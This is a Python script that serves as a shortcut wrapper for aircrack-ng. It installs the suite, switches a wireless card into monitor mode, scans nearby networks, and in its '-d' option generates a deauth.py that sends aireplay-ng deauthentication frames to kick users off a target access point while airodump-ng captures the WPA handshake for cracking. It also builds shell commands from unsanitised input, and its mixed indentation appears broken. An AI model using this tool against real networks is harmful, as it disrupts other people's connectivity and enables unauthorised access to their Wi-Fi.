import os, sys
from time import sleep

def i():
	os.system("clear")
	print("Installing everything that is required:")
	sleep(2)
	print("Updating...")
	os.system("sudo apt-get update")
        sleep(1)
	os.system("clear")
	print("Upgrading...")
        os.system("sudo apt-get upgrade")
	sleep(1)
        os.system("clear")
        print("Installing Aircrack-ng...")
        os.system("sudo apt-get install aircrack-ng")
	sleep(1)
	print("Finished!")


def mc():
	l = open("NODELETE.txt","r")
	il = l.read()
	sleep(.5)
	c = raw_input("Enter The Channel of the Network ")
	sleep(.5)
	bs = raw_input("Enter The MAC addres of the Network ")
	sleep(.5)
	command = "airodump-ng --bssid "+bs+" -c "+c+" "+il
	l.close()
	os.system(command)
def m():
	l = open("NODELETE.txt","r")
	il = l.read()
	sleep(.5)
	command = "airodump-ng "+il
	l.close()
	os.system(command)

def si():
	print("Your network interfaces are...")
	sleep(6)
	os.system("airmon-ng")
	sleep(.5)
	os.system("airmon-ng check kill")
	sleep(1)
	i = raw_input("Enter your network interface ")
	sleep(1)
	command = "airmon-ng start "+i
	os.system(command)
	l = open("NODELETE.txt","w")
	l.write(i+"mon")
	l.close()
	sleep(1)
	print("Done")

def d():
	l = open("NODELETE.txt","r")
        il = l.read()
	sleep(.5)
	f = raw_input("Name of the file that will be written ")
        sleep(.5)
        c = raw_input("Enter The Channel of the Network ")
        sleep(.5)
        bs = raw_input("Enter The MAC addres of the Network ")
        sleep(.5)
	dea =raw_input("How many times do you want to deauthenticate the users ")
#-------------------------------------------------------------------
	command2 = "aireplay-ng --deauth "+dea+" -a "+bs+" "+il
	a = "import os\n"
        s = open("deauth.py","w")
        s.write(a)
        s.write("os.system('"+command2+"')")
        s.close()
#--------------------------------------------------------------------
	print("Now press control + shift + t and in that window type python deauth.py ")
	sleep(5)
        command = "airodump-ng --bssid "+bs+" -c "+c+" --write  "+f+" "+il
        l.close()
        os.system(command)


def h():
	print("Aircrack-ng shortcut script\n")
	sleep(2)
	print("""
Available commands:

	-h		This menu!
	-mc		Monitor a network
	-m		See all the networks around you
	-si		Start your interface on monitor mode
	-i		Install all that is required
	-d		Try and capture a handshake"
""")
	
try:
	a = sys.argv[1]	
	if a == "-h" or a == "--help":
		h()
	elif a == "-si":
		si()
	elif a == "-mc":
		mc()
	elif a == "-m":
		m()
	elif a == "-i":
		i()
	elif a == "-d":
		d()
	else:
		h()
except IndexError:
	h()
